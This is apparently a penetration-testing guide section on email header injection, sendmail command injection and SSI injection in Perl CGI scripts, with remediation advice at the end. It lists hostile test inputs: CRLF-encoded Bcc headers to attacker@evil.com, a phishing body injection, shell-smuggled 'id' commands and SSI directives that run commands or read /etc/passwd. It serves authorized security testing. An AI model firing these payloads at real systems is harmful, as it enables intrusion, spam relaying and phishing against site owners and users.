# Email header injection & SSI (Perl/CGI)

1. **Mail header injection** (classic Perl contact/feedback-form bug): the
   script pipes to sendmail — `open(MAIL,"|/usr/sbin/sendmail -t")` then
   `print MAIL "To: $to\nSubject: $subj\n..."`. A newline in a field injects
   headers. Test every mail-adjacent field (`name`, `subject`, `email`,
   `reply-to`): `foo%0aBcc:attacker@evil.com`, `%0d%0aCc:attacker@evil.com`,
   lone `%0a`/`%0d`, double-encoded `%250a`; a delivered Bcc/Cc or an accepted
   extra header ⇒ vulnerable (often also an open spam relay). Overriding
   `Content-Type` with a blank line lets you replace the whole body:
   `foo%0aContent-Type:text/html%0a%0a<h1>phish</h1>`.
2. **Sendmail COMMAND injection (separate bug, same feature)**: if `$to`/`$from`
   is interpolated into the sendmail COMMAND LINE rather than piped as mail
   data — `open(MAIL, "|/usr/sbin/sendmail $to")` (no `-t`, no quoting) — shell
   metacharacters in that field are `20-command-injection.md` territory, not
   header injection: try `x@x.com;id`, `` x@x.com`id` ``. Distinguish the two
   bugs by evidence: a delivered extra header ⇒ CRLF injection; `uid=` in the
   response/timing delay ⇒ command injection.
3. **SSI injection**: if pages are `.shtml` (or the dir has `Options
   +Includes`), reflected/stored input may be parsed — inject
   `<!--#exec cmd="id"-->` or `<!--#include virtual="/etc/passwd"-->` and read
   it back. Confirm the command output / file contents in the rendered page.

Evidence: an injected mail header (Bcc delivered), `uid=`/delay from the
sendmail command line, or `<!--#exec-->` command output.
Remediation: reject CR/LF in mail fields; use `Email::*`/`Net::SMTP` modules
instead of raw sendmail pipes; never interpolate user input into a shell
command line even for the mailer path; disable SSI (`Options -Includes`) where
it isn't needed.
